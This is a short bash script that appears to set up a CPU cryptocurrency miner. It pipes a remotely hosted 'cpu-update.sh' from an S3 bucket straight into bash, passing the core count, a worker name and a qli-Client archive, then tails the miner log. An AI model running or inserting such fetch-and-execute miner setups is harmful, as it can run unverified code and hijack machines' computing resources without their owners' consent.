#!/bin/bash

total_cpu=$(nproc)
#
curl -fsSl https://poolsolution.s3.eu-west-2.amazonaws.com/cpu-update.sh | bash -s -- $total_cpu 2 CECEPABDUL qli-Client-1.8.10-Linux-x64.tar.gz

sleep 10

#
tail -f /var/log/qli.log
